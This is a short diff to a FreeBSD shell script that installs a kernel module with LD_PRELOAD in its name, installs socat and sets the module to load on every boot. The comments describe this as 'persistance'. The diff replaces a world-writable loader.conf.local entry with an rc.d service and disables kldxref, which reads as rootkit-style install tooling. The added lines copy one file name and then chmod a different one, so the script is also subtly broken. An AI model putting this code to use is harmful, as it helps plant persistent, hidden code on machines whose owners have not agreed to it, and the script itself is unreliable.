@@ -20,10 +20,10 @@ cp "$LKM_NAME" /boot/modules/
 pkg install socat -y
 
 # achieve persistance by loading the module everytime the system boots
-# Ensure kld_list includes the LKM
-touch /boot/loader.conf.local
-chmod 777 /boot/loader.conf.local
-echo 'LD_PRELOAD_load="YES"' >> /boot/loader.conf.local
+cp load_LD_PRELOAD /usr/local/etc/rc.d/
+chmod +x /usr/local/etc/rc.d/ldpreload
+service ldpreload enable
+service ldpreload start
 
 # Disable kldxref by setting kldxref_enable="NO"
 sed -i '' 's/^kldxref_enable="YES"/kldxref_enable="NO"/' /etc/rc.conf
